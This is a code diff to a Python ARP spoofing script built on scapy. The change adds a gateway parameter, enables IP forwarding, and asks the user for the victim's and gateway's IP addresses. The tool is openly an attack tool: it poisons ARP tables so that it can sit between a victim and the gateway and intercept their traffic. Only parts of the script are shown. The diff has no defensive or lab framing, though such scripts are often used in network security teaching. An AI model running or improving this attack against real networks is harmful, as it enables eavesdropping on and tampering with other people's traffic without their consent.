@@ -1,7 +1,7 @@
 import time
 from functions import *
 
-def arp_spoofing(victim_ip, output = False):
+def arp_spoofing(victim_ip, gateway, output = False):
     """
     Performs the ARP spoofing attack
     The function should be executed during the attack,
@@ -21,8 +21,7 @@ def arp_spoofing(victim_ip, output = False):
 
     sleep = 2
     packets_count = 0
-    gateway = scapy.conf.route.route("0.0.0.0")[2]
-    #enable_ip_forwarding()
+    enable_ip_forwarding()
     
     try:
         while True:
@@ -49,4 +48,5 @@ def arp_spoofing(victim_ip, output = False):
         print("\n ARP tables restored.")
         
 victim_ip = input("Enter victim's IP address: ")
-arp_spoofing(victim_ip, False)
+gateway = input("Enter gateway's IP address: ")
+arp_spoofing(victim_ip, gateway, False)
